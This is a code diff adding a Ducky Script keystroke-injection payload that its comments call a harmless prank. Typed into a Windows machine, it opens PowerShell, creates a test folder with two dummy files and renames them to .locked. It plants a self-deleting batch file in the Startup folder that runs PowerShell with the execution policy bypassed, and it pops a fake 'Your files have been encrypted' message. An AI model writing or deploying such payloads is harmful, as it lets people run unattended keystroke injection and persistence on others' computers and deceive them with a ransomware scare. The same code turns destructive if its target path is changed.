@@ -1,0 +1,58 @@
+REM Harmless prank — creates Desktop\Downloads_Prank_Test, 2 dummy files, renames them to .locked,
+REM writes cleanup_prank.bat into Startup that restores those files on next login and deletes itself.
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 800
+
+REM create test folder
+STRING $folder = "$env:USERPROFILE\Desktop\Downloads_Prank_Test"
+ENTER
+DELAY 200
+STRING New-Item -Path $folder -ItemType Directory -Force | Out-Null
+ENTER
+DELAY 300
+
+REM create harmless dummy files
+STRING Set-Content -Path (Join-Path $folder 'file1.txt') -Value 'PRANK FILE 1 — harmless'
+ENTER
+DELAY 150
+STRING Set-Content -Path (Join-Path $folder 'file2.txt') -Value 'PRANK FILE 2 — harmless'
+ENTER
+DELAY 300
+
+REM rename only those dummy files to .locked
+STRING Get-ChildItem -Path $folder -File | ForEach-Object { Rename-Item -LiteralPath $_.FullName -NewName ($_.Name + '.locked') }
+ENTER
+DELAY 400
+
+REM create cleanup batch in Startup that calls PowerShell to restore and then deletes itself
+STRING $startup = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+ENTER
+DELAY 150
+STRING $batPath = Join-Path $startup 'cleanup_prank.bat'
+ENTER
+DELAY 150
+STRING $batContent = '@echo off
+powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem -Path ''%USERPROFILE%\Desktop\Downloads_Prank_Test'' -File | Where-Object { $_.Extension -eq ''.locked'' } | ForEach-Object { Rename-Item -LiteralPath $_.FullName -NewName $_.BaseName }"
+del "%~f0"'
+ENTER
+DELAY 300
+STRING Set-Content -Path $batPath -Value $batContent -Encoding ASCII
+ENTER
+DELAY 300
+
+REM show a harmless prank message
+STRING Add-Type -AssemblyName PresentationFramework
+ENTER
+DELAY 150
+STRING [System.Windows.MessageBox]::Show('Your files have been encrypted','PRANK')
+ENTER
+DELAY 200
+
+STRING exit
+ENTER
+
